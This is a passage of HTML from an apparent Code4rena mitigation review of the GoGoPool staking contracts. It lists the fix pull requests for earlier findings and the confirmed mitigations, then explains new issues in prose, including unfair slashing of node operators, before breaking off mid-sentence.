height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview of Changes</h2>\n<p><strong>Summary from the Sponsor:</strong></p>\n<blockquote>\n<p>Here’s our biggest changes to look out for:</p>\n<ol>\n<li>Minipool State Machine - We’ve tightened up the allowed state transitions including a new recreate minipool method that’s atomic and doesn’t allow node ops to withdraw funds or hijack a minipool.</li>\n<li>Tracking AVAX High Water - Our previous system forced some tradeoffs to which AVAX is calculated in HighWater. We added a new variable <code>AVAXValidating</code> which tracks amount of AVAX actually validating on the P-Chain, and High Water is simply the highest validating amount during the period.</li>\n<li>TokenGGP - Changed how tokens are inflated to actually mint rather than track tokens in the ProtocolDAO</li>\n<li>Contract Upgrades - We’re now able to upgrade as expected, to a contract with the same name as the existing contract</li>\n<li>Upgradeable Tokens - ERC20Upgradeable takes a variable version for it’s domain separator and we added storage gaps across the board</li>\n</ol>\n</blockquote>\n<h2 id=\"mitigation-review-scope\" style=\"position:relative;\"><a href=\"#mitigation-review-scope\" aria-label=\"mitigation review scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation Review Scope</h2>\n<table>\n<thead>\n<tr>\n<th>URL</th>\n<th>Mitigation of</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/25\">https://github.com/multisig-labs/gogopool/pull/25</a></td>\n<td>H-01</td>\n<td>New variable to track validating avax</td>\n</tr>\n<tr>\n<td>Not fixing</td>\n<td>H-02</td>\n<td>N/A</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/41\">https://github.com/multisig-labs/gogopool/pull/41</a></td>\n<td>H-03</td>\n<td>Base slash on validation period not full duration</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/23\">https://github.com/multisig-labs/gogopool/pull/23</a></td>\n<td>H-04</td>\n<td>Atomically recreate minipool to now allow hijack</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/49\">https://github.com/multisig-labs/gogopool/pull/49</a></td>\n<td>H-05</td>\n<td>Initialize ggAVAX with a deposit</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/41\">https://github.com/multisig-labs/gogopool/pull/41</a></td>\n<td>H-06</td>\n<td>If staked GGP doesn’t cover slash amount, slash it all</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/22\">https://github.com/multisig-labs/gogopool/pull/22</a></td>\n<td>M-01</td>\n<td>Pause startRewardsCycle when protocol is paused</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/32\">https://github.com/multisig-labs/gogopool/pull/32</a></td>\n<td>M-02</td>\n<td>Fix upgrade to work when a contract has the same name</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/20\">https://github.com/multisig-labs/gogopool/pull/20</a></td>\n<td>M-03</td>\n<td>Remove method that trapped Node Operator’s funds</td>\n</tr>\n<tr>\n<td>Not fixing</td>\n<td>M-04</td>\n<td>N/A</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/22\">https://github.com/multisig-labs/gogopool/pull/22</a></td>\n<td>M-05</td>\n<td>Pause claimAndRestake as well</td>\n</tr>\n<tr>\n<td>Not fixing</td>\n<td>M-06</td>\n<td>N/A</td>\n</tr>\n<tr>\n<td>Not fixing</td>\n<td>M-07</td>\n<td>N/A</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/43\">https://github.com/multisig-labs/gogopool/pull/43</a></td>\n<td>M-08</td>\n<td>Use liquid staker avax amount instead of node op amount</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/23\">https://github.com/multisig-labs/gogopool/pull/23</a></td>\n<td>M-09</td>\n<td>Atomically recreate minipool so a node operator can’t withdraw inbetween</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/51\">https://github.com/multisig-labs/gogopool/pull/51</a></td>\n<td>M-10</td>\n<td>Reset rewards start time in cancel minipool</td>\n</tr>\n<tr>\n<td>Not fixing</td>\n<td>M-11</td>\n<td>N/A</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/40\">https://github.com/multisig-labs/gogopool/pull/40</a></td>\n<td>M-12</td>\n<td>Base cancelMinipool delay on minipool creation time not rewards start time</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/41\">https://github.com/multisig-labs/gogopool/pull/41</a></td>\n<td>M-13</td>\n<td>If staked GGP doesn’t cover slash amount, slash it all</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/38\">https://github.com/multisig-labs/gogopool/pull/38</a></td>\n<td>M-14</td>\n<td>Added bounds for duration passed by Node Operator</td>\n</tr>\n<tr>\n<td>Not fixing in this version of the protocol</td>\n<td>M-15</td>\n<td>N/A</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/50\">https://github.com/multisig-labs/gogopool/pull/50</a></td>\n<td>M-16</td>\n<td>ggAVAX max redeem incorrect, <strong>not fixing</strong>, but made test to illustrate.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/28\">https://github.com/multisig-labs/gogopool/pull/28</a></td>\n<td>M-17</td>\n<td>Remove the state transition from Staking to Error.</td>\n</tr>\n<tr>\n<td>Not fixing in this version of the protocol</td>\n<td>M-18</td>\n<td>N/A</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/42\">https://github.com/multisig-labs/gogopool/pull/42</a></td>\n<td>M-19</td>\n<td>We removed minipool count entirely.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/33\">https://github.com/multisig-labs/gogopool/pull/33</a></td>\n<td>M-20</td>\n<td>Return correct value from maxMint and maxDeposit when the contract is paused.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/multisig-labs/gogopool/pull/37\">https://github.com/multisig-labs/gogopool/pull/37</a></td>\n<td>M-21</td>\n<td>Prevents division by zero error blocking startRewardCycle().</td>\n</tr>\n<tr>\n<td>Not fixing in this version of the protocol</td>\n<td>M-22</td>\n<td>N/A</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"mitigation-review-summary\" style=\"position:relative;\"><a href=\"#mitigation-review-summary\" aria-label=\"mitigation review summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation Review Summary</h2>\n<p>Of the mitigations reviewed, 13 have been confirmed as well as 2 confirmed with comments:</p>\n<ul>\n<li><strong>H-01:</strong> Mitigation confirmed with comments (full details in <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/2\">report from RaymondFam</a>)</li>\n<li><strong>H-03:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/3\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/22\">hansfriese</a></li>\n<li><strong>H-05:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/5\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/24\">hansfriese</a></li>\n<li><strong>M-01:</strong> Mitigation confirmed with comments (full details in <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/12\">report from RaymondFam</a>)</li>\n<li><strong>M-02:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/11\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/27\">hansfriese</a></li>\n<li><strong>M-03:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/13\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/28\">hansfriese</a></li>\n<li><strong>M-05:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/14\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/30\">hansfriese</a></li>\n<li><strong>M-09:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/15\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/34\">hansfriese</a></li>\n<li><strong>M-10:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/16\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/35\">hansfriese</a></li>\n<li><strong>M-12:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/17\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/37\">hansfriese</a></li>\n<li><strong>M-13:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/56\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/38\">hansfriese</a></li>\n<li><strong>M-14:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/57\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/39\">hansfriese</a></li>\n<li><strong>M-17:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/58\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/42\">hansfriese</a></li>\n<li><strong>M-19:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/59\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/44\">hansfriese</a></li>\n<li><strong>M-20:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/60\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/45\">hansfriese</a></li>\n</ul>\n<p>The 4 remaining mitigations have either not been confirmed and/or introduced new issues. See full details below.<br>\n<em>(Note: mitigation reviews below are referenced as <code>MR:S-N</code>, <code>MitigationReview:NewIssueSeverity-NewIssueNumber</code>)</em></p>\n<h2 id=\"mrm-01-the-node-operators-are-likely-to-be-slashed-in-an-unfair-way\" style=\"position:relative;\"><a href=\"#mrm-01-the-node-operators-are-likely-to-be-slashed-in-an-unfair-way\" aria-label=\"mrm 01 the node operators are likely to be slashed in an unfair way permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/23\">[MR:M-01] The node operators are likely to be slashed in an unfair way</a></h2>\n<p><em>Submitted by hansfriese</em></p>\n<h3 id=\"original-issue\" style=\"position:relative;\"><a href=\"#original-issue\" aria-label=\"original issue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Original Issue</h3>\n<p>H-04: <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/213\">Hijacking of node operators minipool causes loss of staked funds</a></p>\n<h3 id=\"comments\" style=\"position:relative;\"><a href=\"#comments\" aria-label=\"comments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Comments</h3>\n<p>In the original implementation, the protocol had some unnecessary state transitions and it was possible for node operators to interfere the recreation process.<br>\nThe main problem was the <code>recordStakingEnd()</code> and <code>recreateMiniPool()</code> were separate external functions and the operator could frontrun the <code>recreateMiniPool()</code> and call <code>withdrawMinipoolFunds()</code>.</p>\n<h3 id=\"mitigation\" style=\"position:relative;\"><a href=\"#mitigation\" aria-label=\"mitigation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p><a href=\"https://github.com/multisig-labs/gogopool/pull/23\">PR #23</a><br>\nThe mitigation added a new function <code>recordStakingEndThenMaybeCycle()</code> and handled <code>recordStakingEnd()</code> and <code>recreateMiniPool()</code> in an atomic way.<br>\nWith this mitigation, the state flow is now as below and it is impossible for a node operator to interfere the recreation process.<br>\n<img src=\"https://imgur.com/JCoiCvl.jpg\" alt=\"Imgur\">\nBut this mitigation created another minor issue that the node operators have risks to be slashed in an unfair way.</p>\n<h3 id=\"new-issue\" style=\"position:relative;\"><a href=\"#new-issue\" aria-label=\"new issue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>New issue</h3>\n<p>The node operators are likely to be slashed in an unfair way</p>\n<h3 id=\"code-snippet\" style=\"position:relative;\"><a href=\"#code-snippet\" aria-label=\"code snippet permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code snippet</h3>\n<p><a href=\"https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/MinipoolManager.sol#L464\">https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/MinipoolManager.sol#L464</a></p>\n<h3 id=\"proof-of-concept-26\" style=\"position:relative;\"><a href=\"#proof-of-concept-26\" aria-label=\"proof of concept 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of concept</h3>\n<p>In the previous implementation, I assumed rialtos are smart enough to recreate minipools only when it’s necessary.<br>\nBut now, the recreation process is included as an optional way in the <code>recordStakingEndThenMaybeCycle()</code>, so as long as the check <code>initialStartTime + duration > block.timestamp</code> at L#464 passes, recreation will be processed.</p>\n<p>Now let us consider the timeline. One validation cycle in the whole sense contains several steps as below.\n<img src=\"https://imgur.com/p6xWqgC.jpg\" alt=\"Imgur\"></p>\n<ol>\n<li>Let us assume it is somehow possible that <code>startTime[1] > endTime[0]</code>, i.e., the multisig failed to start the next cycle at the exact the same timestamp to the previous end time. This is quite possible due to various reasons because there are external processes included.\nIn this case the timeline will look as below.<br>\n<img src=\"https://imgur.com/e292GIO.jpg\" alt=\"Imgur\">\nAs an extreme example, let us say the node operator created a minipool with duration of 42 days (with 3 cycles in mind) and it took 12 days to start the second cycle. When the <code>recordStakingEndThenMaybeCycle()</code> (finishing the second cycle) was called, two cases are possible.</li>\n<li>It is possible that the <code>initialStartTime + duration &#x3C;= block.timestamp</code>. In this case, the protocol will not start the next cycle. And the node validation was done for two cycles different to the initial plan.</li>\n<li>If <code>initialStartTime + duration > block.timestamp</code>, the protocol will start the third cycle. But on the end of that cycle, it is likely that the node is not eligible for reward by the Avalanche validators voting. (Imagine the node op lent a server for 42 days, then 42-14*2-12=2 days from the third cycle start the node might have stopped working and does not meet the 80% uptime condition) Then the node operator will be punished and GGP stake will be slashed. This is unfair.</li>\n<li>Assume it is 100% guaranteed that <code>startTime[n+1]=endTime[n]</code> for all cycles.<br>\nThe timeline will look as below and we can say the second case of the above scenario still exists if the node operator didn’t specify the duration to be a complete multiple of 14 days. (365 days is not!)<br>\n<img src=\"https://imgur.com/tGHnMTL.jpg\" alt=\"Imgur\">\nThen the last cycle end will be later than <code>initialStartTime + duration</code> and the node op can be slashed in an unfair way again.<br>\nSo even assuming the perfect condition, the protocol works in kind of unfair way for node operators.</li>\n</ol>\n<p>The main reason of this problem is that technically there exists two timelines. And the protocol does not track the actual validation duration that the node was used accurately.<br>\nAt least, the protocol should not start a new cycle if <code>initialStartTime + duration &#x3C; block.timestamp + 14 days</code> because it is likely that the node operator get punished at the end of that cycle.</p>\n<h3 id=\"recommended-additional-mitigation\" style=\"position:relative;\"><a href=\"#recommended-additional-mitigation\" aria-label=\"recommended additional mitigation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended additional mitigation</h3>\n<ul>\n<li>If it is 100% guaranteed that <code>startTime[n+1]=endTime[n]</code> for all cycles, I recommend starting a new cycle only if <code>initialStartTime + duration &#x3C; block.timestamp + 14 days</code>.</li>\n<li>If not, I suggest adding a new state variable that will track the actual validation period (actual utilized period).</li>\n</ul>\n<h3 id=\"conclusion\" style=\"position:relative;\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h3>\n<p>Mitigation error - created another issue for the same edge case.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/23#issuecomment-1437349389\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Per full discussion with sponsor and warden <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/23#issuecomment-1433580156\">here</a>, Medium seems like the most appropriate Severity, the finding is valid though in that the FSM can behave in an unintended way due to lack of modulo math.</p>\n</blockquote>\n<hr>\n<h2 id=\"mrm-02-deficiency-of-slashed-ggp-amount-should-be-made-up-from-node-operators-avax\" style=\"position:relative;\"><a href=\"#mrm-02-deficiency-of-slashed-ggp-amount-should-be-made-up-from-node-operators-avax\" aria-label=\"mrm 02 deficiency of slashed ggp amount should be made up from node operators avax permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6\">[MR:M-02] Deficiency of slashed GGP amount should be made up from node operator’s AVAX</a></h2>\n<p><em>Submitted by RaymondFam, also found by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/25\">hansfriese</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/61\">ladboy233</a></em></p>\n<p><a href=\"https://github.com/multisig-labs/gogopool/blob/9ad393c825e6ac32f3f6c017b4926806a9383df1/contracts/contract/MinipoolManager.sol#L731-L733\">https://github.com/multisig-labs/gogopool/blob/9ad393c825e6ac32f3f6c017b4926806a9383df1/contracts/contract/MinipoolManager.sol#L731-L733</a></p>\n<h3 id=\"original-issue-1\" style=\"position:relative;\"><a href=\"#original-issue-1\" aria-label=\"original issue 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Original Issue</h3>\n<p>H-06: <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/136\">MinipoolManager: node operator can avoid being slashed</a></p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>If staked GGP doesn’t cover slash amount, slashing it all will not be fair to the liquid stakers. Slashing is rare, and that the current 14 day validation cycle which is typically 1/26 of the 